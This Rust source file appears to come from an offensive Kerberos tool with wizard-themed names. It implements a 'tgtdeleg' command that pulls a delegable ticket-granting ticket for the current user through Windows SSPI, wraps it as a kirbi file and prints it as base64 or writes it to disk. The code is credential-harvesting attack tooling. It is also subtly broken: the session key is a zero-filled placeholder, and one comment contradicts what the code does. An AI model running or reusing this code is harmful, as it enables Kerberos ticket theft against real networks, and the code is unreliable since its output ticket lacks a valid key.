use anyhow::Result;
use std::collections::HashMap;
use crate::dungeon::display_charm::*;

pub struct Confundus;

impl super::Spell for Confundus {
    fn incantation(&self) -> &'static str { "confundus" }
    fn grimoire(&self) -> &'static str {
        "Obtain a delegable TGT for the current user without elevation (TGTdeleg). \
        [/outfile:] [Windows only]"
    }
    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        #[cfg(windows)]
        {
            return tgtdeleg_windows(args);
        }
        #[cfg(not(windows))]
        {
            let _ = args;
            anyhow::bail!("tgtdeleg requires Windows SSPI — use tickets from the ccache directly on Linux/macOS")
        }
    }
}

#[cfg(windows)]
fn tgtdeleg_windows(args: &HashMap<String, String>) -> Result<()> {
    use windows::Win32::Security::Authentication::Identity::{
        AcquireCredentialsHandleW, InitializeSecurityContextW, FreeCredentialsHandle,
        DeleteSecurityContext, FreeContextBuffer,
        SecBuffer, SecBufferDesc,
        SECPKG_CRED_OUTBOUND,
        ISC_REQ_ALLOCATE_MEMORY, ISC_REQ_DELEGATE, ISC_REQ_MUTUAL_AUTH,
    };
    use windows::Win32::Security::Credentials::SecHandle;
    use windows::core::{PCWSTR, HRESULT};

    type CredHandle = SecHandle;
    type CtxtHandle = SecHandle;
    const SEC_I_CONTINUE_NEEDED: HRESULT = HRESULT(0x00090312u32 as i32);
    const SEC_E_OK: HRESULT = HRESULT(0);

    const SECBUFFER_TOKEN: u32 = 2;
    const SECBUFFER_VERSION: u32 = 0;

    print_banner("Requesting delegable TGT via SSPI");

    let target_name = "host/localhost\0";
    let w_target: Vec<u16> = target_name.encode_utf16().collect();
    let kerberos: Vec<u16> = "Kerberos\0".encode_utf16().collect();

    let mut cred_handle: CredHandle = unsafe { std::mem::zeroed() };
    let mut expiry = unsafe { std::mem::zeroed() };

    unsafe {
        AcquireCredentialsHandleW(
            PCWSTR::null(),
            PCWSTR(kerberos.as_ptr()),
            SECPKG_CRED_OUTBOUND,
            None,
            None,
            None,
            None,
            &mut cred_handle,
            Some(&mut expiry),
        ).map_err(|e| anyhow::anyhow!("AcquireCredentialsHandleW: {}", e))?;
    }

    let isc_req = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY;

    let mut ctx_handle: CtxtHandle = unsafe { std::mem::zeroed() };
    let mut out_buf_data: *mut u8 = std::ptr::null_mut();
    let mut out_buf = SecBuffer {
        cbBuffer: 0,
        BufferType: SECBUFFER_TOKEN,
        pvBuffer: std::ptr::null_mut(),
    };
    let mut out_desc = SecBufferDesc {
        ulVersion: SECBUFFER_VERSION,
        cBuffers: 1,
        pBuffers: &mut out_buf,
    };
    let mut ctx_attrs: u32 = 0;

    let status = unsafe {
        InitializeSecurityContextW(
            Some(std::ptr::addr_of!(cred_handle)),
            None,
            Some(w_target.as_ptr()),
            isc_req,
            0,
            16, // SECURITY_NATIVE_DREP
            None,
            0,
            Some(std::ptr::addr_of_mut!(ctx_handle)),
            Some(std::ptr::addr_of_mut!(out_desc)),
            std::ptr::addr_of_mut!(ctx_attrs),
            None,
        )
    };

    if status != SEC_I_CONTINUE_NEEDED && status != SEC_E_OK {
        unsafe { let _ = FreeCredentialsHandle(&mut cred_handle); }
        anyhow::bail!("InitializeSecurityContext failed: 0x{:08x}", status.0);
    }

    // Output token is in out_buf.pvBuffer
    let token = if out_buf.pvBuffer.is_null() || out_buf.cbBuffer == 0 {
        unsafe {
            let _ = DeleteSecurityContext(&mut ctx_handle);
            let _ = FreeCredentialsHandle(&mut cred_handle);
        }
        anyhow::bail!("SSPI returned empty token");
    } else {
        let bytes = unsafe {
            std::slice::from_raw_parts(out_buf.pvBuffer as *const u8, out_buf.cbBuffer as usize)
        }.to_vec();
        unsafe { let _ = FreeContextBuffer(out_buf.pvBuffer); }
        bytes
    };

    unsafe {
        let _ = DeleteSecurityContext(&mut ctx_handle);
        let _ = FreeCredentialsHandle(&mut cred_handle);
    }

    // Parse the GSSAPI token: 0x60 (APPLICATION 0) + OID + token_type + AP-REQ
    let kirbi = extract_kirbi_from_gss_token(&token)?;

    print_success("Delegated TGT extracted from SSPI token");
    let b64 = crate::dungeon::wand_utils::kirbi_to_b64(&kirbi);
    println!();
    println!("{}", b64);
    println!();

    if let Some(outfile) = args.get("outfile") {
        std::fs::write(outfile, &kirbi)?;
        print_success(&format!("Written to {}", outfile));
    }
    Ok(())
}

#[cfg(windows)]
fn extract_kirbi_from_gss_token(token: &[u8]) -> anyhow::Result<Vec<u8>> {
    use crate::dungeon::krb_structures::*;

    // GSSAPI token: 0x60 APP_TAG + len + OID(krb5) + 0x01 0x00 (AP-REQ token type) + AP-REQ
    if token.is_empty() || token[0] != 0x60 {
        anyhow::bail!("not a GSSAPI token (expected 0x60 tag)");
    }
    let mut pos = 1usize;
    // Skip length
    if pos >= token.len() { anyhow::bail!("truncated GSS token"); }
    if token[pos] & 0x80 != 0 {
        let n = (token[pos] & 0x7f) as usize;
        pos += 1 + n;
    } else {
        pos += 1;
    }
    // Skip OID: 0x06 + len + oid_bytes
    if pos + 1 >= token.len() { anyhow::bail!("truncated after GSS length"); }
    if token[pos] != 0x06 { anyhow::bail!("expected OID in GSS token"); }
    let oid_len = token[pos + 1] as usize;
    pos += 2 + oid_len;
    // Skip 2-byte token type (0x01 0x00 for AP-REQ)
    pos += 2;
    if pos >= token.len() { anyhow::bail!("no AP-REQ after GSS wrapper"); }

    let ap_req_bytes = &token[pos..];

    // Parse AP-REQ to extract the ticket
    let mut p = DerParser::new(ap_req_bytes);
    let raw = p.expect_tag(TAG_AP_REQ)?;
    let mut seq = DerParser::new(raw);
    let mut inner = seq.enter_sequence()?;
    inner.enter_ctx(0)?.read_uint32()?; // pvno
    inner.enter_ctx(1)?.read_uint32()?; // msg-type
    inner.enter_ctx(2)?.read_bit_string_flags()?; // ap-options
    let ticket_raw = inner.slice_ctx(3)?;

    // Wrap ticket bytes with TAG_TICKET
    let mut wrapped = vec![TAG_TICKET];
    wrapped.extend_from_slice(&encode_length(ticket_raw.len()));
    wrapped.extend_from_slice(ticket_raw);
    let ticket = Scroll::decode_from_bytes(&wrapped)?;

    // Build a minimal kirbi from the ticket
    // The session key is not easily obtainable here without decrypting the ticket
    // We return the AP-REQ itself as the "kirbi" for further use
    // A proper implementation would extract from enc-part (needs krbtgt key)
    let cred_info = KrbCredInfo {
        key: MagicKey { keytype: 23, keyvalue: vec![0u8; 16] }, // placeholder
        prealm: Some(ticket.realm.clone()),
        pname: None,
        flags: None,
        auth_time: None,
        start_time: None,
        end_time: None,
        renew_till: None,
        srealm: Some(ticket.realm.clone()),
        sname: Some(ticket.sname.clone()),
    };
    Ok(build_kirbi(&ticket, cred_info))
}
